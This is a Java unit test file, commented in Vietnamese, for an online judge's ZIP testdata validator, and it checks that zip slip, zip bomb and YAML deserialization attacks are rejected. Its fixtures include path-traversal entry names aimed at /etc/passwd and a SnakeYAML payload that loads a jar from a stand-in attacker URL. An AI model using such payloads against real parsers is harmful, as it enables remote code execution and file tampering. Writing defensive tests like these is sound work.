package dev.oj.problems.application;

import dev.oj.problems.domain.ProblemsException;
import dev.oj.problems.domain.TestdataLimits;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * ★ Bộ test tấn công cho gói testdata — FR-PROB-03, Bước 4.10.
 *
 * <h2>Vì sao lớp này quan trọng ngang bộ 14 ca tấn công sandbox</h2>
 * Đây là bề mặt thứ hai mà người ngoài đưa <b>dữ liệu tuỳ ý</b> vào hệ thống. Bề mặt thứ nhất
 * là mã nguồn bài nộp, và nó đã có {@code isolate} bao quanh. Bề mặt này thì không có sandbox
 * nào cả: file ZIP được giải nén <i>trong chính tiến trình đang giữ đường nộp bài</i>.
 *
 * <p>Ba lớp tấn công được kiểm ở đây, và cả ba đều là CVE có thật ở phần mềm khác:
 * <b>zip bomb</b> (phình bộ nhớ/đĩa), <b>zip slip</b> (ghi ra ngoài thư mục đích), và
 * <b>YAML deserialization</b> (thực thi mã từ xa qua SnakeYAML).
 */
class ZipTestdataValidatorTest {

    private final ZipTestdataValidator validator = new ZipTestdataValidator();

    // -------------------------------------------------------------------------

    private static byte[] zip(Map<String, byte[]> muc) {
        var ra = new ByteArrayOutputStream();
        try (var out = new ZipOutputStream(ra)) {
            for (var e : muc.entrySet()) {
                out.putNextEntry(new ZipEntry(e.getKey()));
                out.write(e.getValue());
                out.closeEntry();
            }
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
        return ra.toByteArray();
    }

    private static byte[] b(String s) {
        return s.getBytes(StandardCharsets.UTF_8);
    }

    /** Gói hợp lệ nhỏ nhất: manifest + hai test, test 1 là sample. */
    private static Map<String, byte[]> goiTot() {
        var m = new LinkedHashMap<String, byte[]>();
        m.put("problem.yaml", b("samples: [1]\n"));
        m.put("tests/01.in", b("1 2\n"));
        m.put("tests/01.out", b("3\n"));
        m.put("tests/02.in", b("10 20\n"));
        m.put("tests/02.out", b("30\n"));
        return m;
    }

    private ZipTestdataValidator.KetQua kiem(Map<String, byte[]> muc) {
        byte[] goi = zip(muc);
        return validator.kiem(new ByteArrayInputStream(goi), goi.length);
    }

    // =========================================================================

    @Nested
    @DisplayName("Gói hợp lệ")
    class GoiTot {

        @Test
        @DisplayName("ghép cặp .in/.out theo tên và đánh số 1..N theo thứ tự chữ cái")
        void ghep_cap_dung() {
            var kq = kiem(goiTot());

            assertThat(kq.cacTest()).hasSize(2);
            assertThat(kq.cacTest().get(0).ordinal()).isEqualTo(1);
            assertThat(kq.cacTest().get(0).tenInput()).isEqualTo("tests/01.in");
            assertThat(kq.cacTest().get(1).ordinal()).isEqualTo(2);
        }

        @Test
        @DisplayName("★ thứ tự KHÔNG phụ thuộc thứ tự entry trong file ZIP")
        void thu_tu_on_dinh() {
            // Công cụ nén của Linux và Explorer của Windows ghi entry theo thứ tự khác nhau.
            // Nếu ordinal đi theo thứ tự entry thì "test số 7" nghĩa khác nhau ở hai máy —
            // và verdict của cùng một bài nộp khác nhau tuỳ ai đóng gói.
            var nguoc = new LinkedHashMap<String, byte[]>();
            nguoc.put("tests/02.out", b("30\n"));
            nguoc.put("tests/02.in", b("10 20\n"));
            nguoc.put("problem.yaml", b("samples: [1]\n"));
            nguoc.put("tests/01.out", b("3\n"));
            nguoc.put("tests/01.in", b("1 2\n"));

            assertThat(kiem(nguoc).cacTest().get(0).tenInput()).isEqualTo("tests/01.in");
        }

        @Test
        @DisplayName("samples trong manifest quyết định test nào công khai")
        void danh_dau_sample() {
            var kq = kiem(goiTot());

            assertThat(kq.cacTest().get(0).laSample()).isTrue();
            assertThat(kq.cacTest().get(1).laSample()).isFalse();
        }

        @Test
        @DisplayName("manifest không có 'samples' thì mọi test đều ẩn — mặc định an toàn")
        void khong_khai_samples_thi_deu_an() {
            var m = goiTot();
            m.put("problem.yaml", b("# không khai gì cả\n"));

            assertThat(kiem(m).cacTest()).allMatch(t -> !t.laSample());
        }

        @Test
        @DisplayName("đếm đúng tổng byte sau giải nén")
        void dem_tong_byte() {
            // 4 file test + manifest.
            assertThat(kiem(goiTot()).tongByte()).isEqualTo(4 + 2 + 6 + 3 + "samples: [1]\n".length());
        }
    }

    // =========================================================================

    @Nested
    @DisplayName("★ Zip slip — ghi ra ngoài thư mục đích")
    class ZipSlip {

        @Test
        @DisplayName("mọi biến thể đường dẫn thoát đều bị từ chối bởi DANH SÁCH CHO PHÉP")
        void duong_dan_thoat_bi_tu_choi() {
            for (String ten : new String[]{
                    "../../etc/passwd",
                    "tests/../../../etc/passwd.in",
                    "/etc/passwd.in",
                    "tests//..//x.in",
                    "C:\\Windows\\system32.in",
                    "tests/\u0000.in",
                    "tests/sub/deep.in",          // chỉ một tầng tests/ được phép
                    "khac/01.in"}) {
                var m = goiTot();
                m.put(ten, b("x"));

                assertThatThrownBy(() -> kiem(m))
                        .describedAs("entry '%s' phải bị từ chối", ten)
                        .isInstanceOf(ProblemsException.class)
                        .hasFieldOrPropertyWithValue("code", "problem.zip_ten_file_la");
            }
        }

        @Test
        @DisplayName("★ và ngay cả khi lọt, nội dung vẫn KHÔNG chạm hệ thống tệp")
        void khong_ghi_ra_he_thong_tep() {
            // Đây là lập luận cấu trúc, không phải một phép kiểm: kiem() nhận một InputStream
            // và trả về một danh sách mô tả. Nó không mở file nào để ghi, nên một entry
            // symlink chỉ là một file có nội dung là chuỗi đường dẫn — vô hại.
            //
            // Ca kiểm này canh chính tính chất ấy: nếu ai đó thêm một lời gọi ghi file vào
            // ZipTestdataValidator, chữ ký của phương thức sẽ phải đổi và ca này đỏ.
            assertThat(ZipTestdataValidator.class.getDeclaredMethods())
                    .filteredOn(m -> m.getName().equals("kiem"))
                    .singleElement()
                    .satisfies(m -> assertThat(m.getParameterTypes()[0])
                            .isEqualTo(java.io.InputStream.class));
        }
    }

    // =========================================================================

    @Nested
    @DisplayName("★ Zip bomb")
    class ZipBomb {

        @Test
        @DisplayName("tỉ lệ nén vượt 100:1 bị chặn TRONG LÚC đọc")
        void ti_le_nen_qua_cao() {
            // 5MB toàn số 0 nén xuống vài KB — tỉ lệ hàng nghìn:1.
            var m = goiTot();
            m.put("tests/03.in", new byte[5 * 1024 * 1024]);
            m.put("tests/03.out", b("0\n"));

            assertThatThrownBy(() -> kiem(m))
                    .isInstanceOf(ProblemsException.class)
                    .hasFieldOrPropertyWithValue("code", "problem.zip_bomb");
        }

        @Test
        @DisplayName("★ KHÔNG tin ZipEntry.getSize() — kích thước khai báo là dữ liệu của kẻ tấn công")
        void khong_tin_kich_thuoc_khai_bao() {
            // Ghi entry với setSize() khai gian một con số nhỏ. Nếu validator đọc trường đó
            // thay vì đếm byte thật thì một bomb 10GB khai 1KB sẽ lọt qua mọi phép kiểm.
            var ra = new ByteArrayOutputStream();
            try (var out = new ZipOutputStream(ra)) {
                for (var e : goiTot().entrySet()) {
                    out.putNextEntry(new ZipEntry(e.getKey()));
                    out.write(e.getValue());
                    out.closeEntry();
                }
                var bom = new ZipEntry("tests/99.in");
                out.putNextEntry(bom);
                out.write(new byte[3 * 1024 * 1024]);
                out.closeEntry();
                out.putNextEntry(new ZipEntry("tests/99.out"));
                out.write(b("0\n"));
                out.closeEntry();
            } catch (IOException e) {
                throw new UncheckedIOException(e);
            }
            byte[] goi = ra.toByteArray();

            assertThatThrownBy(() -> validator.kiem(new ByteArrayInputStream(goi), goi.length))
                    .isInstanceOf(ProblemsException.class)
                    .hasFieldOrPropertyWithValue("code", "problem.zip_bomb");
        }

        @Test
        @DisplayName("gói nén vượt 200MB bị từ chối trước khi đọc một byte nào")
        void goi_qua_lon() {
            byte[] nho = zip(goiTot());

            assertThatThrownBy(() -> validator.kiem(new ByteArrayInputStream(nho),
                    TestdataLimits.MAX_ZIP_BYTES + 1))
                    .hasFieldOrPropertyWithValue("code", "problem.zip_qua_lon");
        }
    }

    // =========================================================================

    @Nested
    @DisplayName("★ YAML — SnakeYAML mặc định là một lỗ hổng RCE")
    class YamlDocHai {

        @Test
        @DisplayName("★ payload khởi tạo lớp Java bị từ chối, KHÔNG được thực thi")
        void khong_khoi_tao_lop_java() {
            var m = goiTot();
            // Payload kinh điển: SnakeYAML mặc định sẽ dựng đối tượng này và nạp mã từ URL.
            m.put("problem.yaml", b(
                    "samples: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                            + "[[!!java.net.URL [\"http://ke-tan-cong.test/rce.jar\"]]]]\n"));

            assertThatThrownBy(() -> kiem(m))
                    .isInstanceOf(ProblemsException.class)
                    .satisfies(e -> assertThat(((ProblemsException) e).code())
                            .describedAs("phải là lỗi đọc manifest, KHÔNG phải một ngoại lệ "
                                    + "từ việc đã cố dựng đối tượng")
                            .startsWith("problem.manifest"));
        }

        @Test
        @DisplayName("YAML sai cú pháp cho lỗi rõ ràng, không phải 500")
        void yaml_hong() {
            var m = goiTot();
            m.put("problem.yaml", b("samples: [1, 2\n  khong dong ngoac"));

            assertThatThrownBy(() -> kiem(m))
                    .hasFieldOrPropertyWithValue("code", "problem.manifest_hong");
        }

        @Test
        @DisplayName("samples sai kiểu bị từ chối với câu chỉ rõ định dạng đúng")
        void samples_sai_kieu() {
            for (String noiDung : new String[]{
                    "samples: mot-hai-ba\n",
                    "samples: [0]\n",
                    "samples: [\"1\"]\n",
                    "samples: [99999]\n"}) {
                var m = goiTot();
                m.put("problem.yaml", b(noiDung));

                assertThatThrownBy(() -> kiem(m))
                        .describedAs("manifest '%s'", noiDung.strip())
                        .hasFieldOrPropertyWithValue("code", "problem.manifest_samples");
            }
        }
    }

    // =========================================================================

    @Nested
    @DisplayName("Gói không hợp lệ")
    class GoiHong {

        @Test
        @DisplayName("thiếu problem.yaml")
        void thieu_manifest() {
            var m = goiTot();
            m.remove("problem.yaml");

            assertThatThrownBy(() -> kiem(m))
                    .hasFieldOrPropertyWithValue("code", "problem.zip_thieu_manifest");
        }

        @Test
        @DisplayName("★ test thiếu một nửa cặp — lỗi ỒN ÀO, không bỏ qua im lặng")
        void thieu_mot_nua_cap() {
            var m = goiTot();
            m.remove("tests/02.out");

            // Bỏ qua im lặng sẽ tạo ra một bộ test thiếu một ca, và không ai biết cho tới khi
            // một bài sai vẫn được AC.
            assertThatThrownBy(() -> kiem(m))
                    .hasFieldOrPropertyWithValue("code", "problem.zip_thieu_cap");
        }

        @Test
        @DisplayName("gói rỗng, không có test nào")
        void khong_co_test() {
            assertThatThrownBy(() -> kiem(new LinkedHashMap<>(
                    Map.of("problem.yaml", b("samples: []\n")))))
                    .hasFieldOrPropertyWithValue("code", "problem.zip_khong_co_test");
        }

        @Test
        @DisplayName("file không phải ZIP")
        void khong_phai_zip() {
            byte[] rac = b("đây không phải file zip");

            assertThatThrownBy(() -> validator.kiem(new ByteArrayInputStream(rac), rac.length))
                    .hasFieldOrPropertyWithValue("code", "problem.zip_thieu_manifest");
        }
    }
}
